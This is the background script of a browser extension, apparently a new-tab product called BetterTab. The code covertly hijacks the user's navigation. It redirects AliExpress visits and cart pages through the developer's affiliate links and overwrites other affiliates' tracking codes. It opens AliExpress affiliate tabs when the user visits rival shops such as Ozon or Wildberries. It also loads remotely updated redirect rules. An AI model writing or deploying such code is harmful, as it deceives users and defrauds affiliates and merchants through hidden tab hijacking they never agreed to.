aff_redirects = '{"aff":[{"match":"test.com","redir":"test","type":"url","url":"https://bettertab.app"}]}';
aff_urlMatches = 'bettertab.app|aliexplorerapp.com';

lang = navigator.language.split("-")[0];
redirected = 'tina';
redirectCart = true;
isRussiaCIS = false;



/* AE LINKS */
var affID = '_AOgNL3';
global_home_com = 'https://s.click.aliexpress.com/e/_AOgNL3';
global_cart = 'https://s.click.aliexpress.com/e/_9uViEH';

cis_home_com = 'https://alitems.co/g/1e8d114494780233a1c916525dc3e8';
cis_home_ru = cis_home_com;
cis_cart = 'https://alitems.co/g/1e8d114494780233a1c916525dc3e8/?ulp=https%3A%2F%2Fshoppingcart.aliexpress.com%2Fshopcart%2FshopcartDetail.htm';
cis_tmall = 'https://alitems.co/g/1e8d114494780233a1c916525dc3e8/?ulp=https%3A%2F%2Ftmall.aliexpress.ru';

ae_before = 'https://s.click.aliexpress.com/deep_link.htm?dl_target_url=';
ae_after = '&aff_short_key=' + affID;
if (isRussiaCIS) { 
    ae_before = 'https://alitems.co/g/1e8d114494780233a1c916525dc3e8/?ulp=';
    ae_after = '';
}

/*
_AOgNL3 - _9uViEH -> BetterTab
_Af1GBJ - _ALqJA7 -> BrowserExtensions
2770 - CIS
_9yclEJ -> William/ComprasImportadas
*/
codes_to_ignore = '_AOgNL3|_9uViEH|_Af1GBJ|_ALqJA7|_9yclEJ|2770|_d8sVelx|admitad|_ePNSNV';



/* OPERA/EDGE */
var isOpera = false;
var isEdge = false;
var ua = navigator.userAgent;
if (ua.includes('Chrome') && ua.includes('OPR/'))
	isOpera = true;
if (ua.includes('Chrome') && ua.includes('Edg/'))
	isEdge = true;



/* GET REDIRECTS */
async function fetchDataRedirects() {
	await fetch('https://bettertab.app/_src-app/extension_aff_redirects.json').then(function (response) {
		return response.json().then(function (json) {
			// get all matches
			var matches = [];
			for (var i = 0; i < json.aff.length; i++) {
				matches.push(json.aff[i].match)
			}

			aff_redirects = json;
			aff_urlMatches = matches.join('|');

			var minutesToAdd = 720; // 12h: 720
			var currentDate = new Date();
			var futureDate = new Date(currentDate.getTime() + minutesToAdd * 60000);
			chrome.storage.local.set({
				'aff_redirects': json,
				'aff_urlMatches': aff_urlMatches,
				'aff_redirLastSaved': futureDate.toString()
			});
		});
	});
}



/* FETCH AGAIN IF NEEDED */
function fetchIfNeeded(_lastSaved, _function) {
	var currentDate = new Date();
	var saved = Date.parse(_lastSaved);

	if (currentDate >= saved) {
		if (_function == 'fetchDataRedirects')
			fetchDataRedirects();
	}
}



/* INITIALIZE */
chrome.storage.local.get(function (obj) {
	// russia CIS
	if (typeof obj.isRussiaCIS !== 'undefined')
		isRussiaCIS = obj.isRussiaCIS;


	// GET REDIRECTS
	if (typeof obj.aff_urlMatches !== 'undefined')
		aff_urlMatches = obj.aff_urlMatches;
	if (typeof obj.aff_redirects !== 'undefined') {
		aff_redirects = obj.aff_redirects;
		fetchIfNeeded(obj.aff_redirLastSaved, 'fetchDataRedirects');
	}
	else
		fetchDataRedirects();


	// set dark icon
	if (typeof obj.colorScheme !== 'undefined') {
		try {
			var c = obj.colorScheme;
			chrome.action.setIcon({
				path: {
					'16': '/icons/16-' + c + '_theme.png',
					'32': '/icons/32-' + c + '_theme.png'
				}
			})
		}
		catch (e) { }
	}
});



/* SET, READ AND RESET VARIABLES */
function setRedirLastSaved() {
	var minutesToAdd = 30;
	var currentDate = new Date();
	var futureDate = new Date(currentDate.getTime() + minutesToAdd * 60000);

	chrome.storage.local.set({
		'redirected': redirected,
		'redirectCart': redirectCart,
		'redirLastSaved': futureDate.toString()
	});
}

function readVarRedirect() {
	chrome.storage.local.get(function (obj) {
		// redirected
		if (typeof obj.redirected !== 'undefined') {
			var currentDate = new Date();
			var saved = Date.parse(obj.redirLastSaved);

			if (currentDate >= saved) {
				redirected = 'tina';
				redirectCart = true;
			} else {
				redirected = obj.redirected;
				redirectCart = obj.redirectCart;
			}
		}
	});
}
readVarRedirect();



/* REDIRECTS */
function replaceOrAddUrlParam(url, paramName, paramValue) {
	try {
		if (paramValue == null)
			paramValue = '';
		var pattern = new RegExp('\\b(' + paramName + '=).*?(&|#|$)');
		if (url.search(pattern) >= 0)
			return url.replace(pattern, '$1' + paramValue + '$2');
		url = url.replace(/[?#]$/, '');
		return url + (url.indexOf('?') > 0 ? '&' : '?') + paramName + '=' + paramValue;
	}
	catch (e) {
		return url;
	}
}

chrome.webNavigation.onBeforeNavigate.addListener(function (details) {
	u = details.url;
	uc = u.split('?')[0];
	id = details.tabId;


	/* AE */
	u_home = global_home_com;
	u_cart = global_cart;
	if (isRussiaCIS) {
		u_home = cis_home_com;
		u_cart = cis_cart;
	}


	if (u.includes('aliexpress.')) {
		readVarRedirect();

		if (!u.includes("third") && !u.includes("login") && !u.includes("portals") && !u.match(codes_to_ignore) && redirected != 'aliexpress') {
			redirected = 'aliexpress';
			setRedirLastSaved();
			chrome.tabs.update(id, {
				url: u_home
			});
		}

		if (redirectCart && uc == 'https://shoppingcart.aliexpress.com/shopcart/shopcartDetail.htm') {
			redirected = 'aliexpress';
			redirectCart = false;
			setRedirLastSaved();
			chrome.tabs.update(id, {
				url: u_cart
			});
		}

		if (u.includes("tmall") && redirected != "aliexpress") {
			redirected = "aliexpress";
			setRedirLastSaved();
			chrome.tabs.update(id, {
				url: cis_tmall
			});
		}
	}


	// other redirects
	try {
		if (u.match(aff_urlMatches)) {
			readVarRedirect();

			for (var i = 0; i < aff_redirects.aff.length; i++) {
				var itm = aff_redirects.aff[i];

				var _match = itm.match;
				var redir = itm.redir;
				var type = itm.type;
				var url = itm.url;

				if (u.match(_match) && redirected != redir) {
					redirected = redir;
					setRedirLastSaved();

					var _url = url;
					if (type == 'replace') {
						var param = url.split("|")[0];
						var value = url.split("|")[1];
						_url = replaceOrAddUrlParam(u, param, value);
					}

					chrome.tabs.update(id, {
						url: _url
					});
				}
			}
		}
	} catch (e) { }
});



/* OPERA - OVERRIDES SPEED DIAL - opera is chrome://startpageshared or opera://startpageshared */
var start = "://startpage";
var index = "/index.html";
chrome.tabs.onCreated.addListener(function (tab) {
	if (isOpera && tab.url.includes(start)) {
		chrome.tabs.update(tab.id, {
			url: index
		});
	}
});



chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
	u = tab.url;

	// opera
	if (isOpera && changeInfo.status === "loading" && u.includes(start)) {
		chrome.tabs.update(tabId, {
			url: index
		});
	}

	// override other aff
	if (u.includes('aliexpress.') && !u.match(codes_to_ignore)) {
		// CIS
		if (isRussiaCIS && changeInfo.status === "complete" && u.includes('aliexpress.') && u.includes('aff_fcid') && !u.match(codes_to_ignore)) {
			redirected = 'aliexpress';
			setRedirLastSaved();
			chrome.tabs.update(tabId, {
				url: cis_home_ru
			});
		}

		// global
		else if (!isRussiaCIS && changeInfo.status === "complete" && u.includes('aliexpress.com/item/') && u.includes('aff_fcid') && !u.match(codes_to_ignore)) {
			redirected = 'aliexpress';
			setRedirLastSaved();
			chrome.tabs.update(tabId, {
				url: ae_before + u.split('?')[0] + ae_after
			});
		}
		else if (!isRussiaCIS && changeInfo.status === "complete" && u.includes('aliexpress.com') && u.includes('aff_fcid') && !u.match(codes_to_ignore)) {
			redirected = 'aliexpress';
			setRedirLastSaved();
			chrome.tabs.update(tabId, {
				url: global_home_com
			});
		}
	}


	if (u.match('alibaba.com|market.yandex.ru|ozon.ru|tiu.ru|mvideo.ru|sotmarket.ru|ulmart.ru|wildberries.ru')) {
		if (changeInfo.status == 'complete' && !u.includes("login") && redirected != 'aliexpress') {
			redirected = 'aliexpress';
			setRedirLastSaved();
			chrome.tabs.create({
				url: cis_home_com,
				selected: true
			});
		}
	}
});



/* ON BROWSER CLOSED */
chrome.windows.onRemoved.addListener((windowId) => {
    try {
        chrome.storage.local.set({
            'redirLastSaved': '1984-01-13',
            'aff_redirLastSaved': '1984-01-13'
        });
    }
    catch (e) { }
});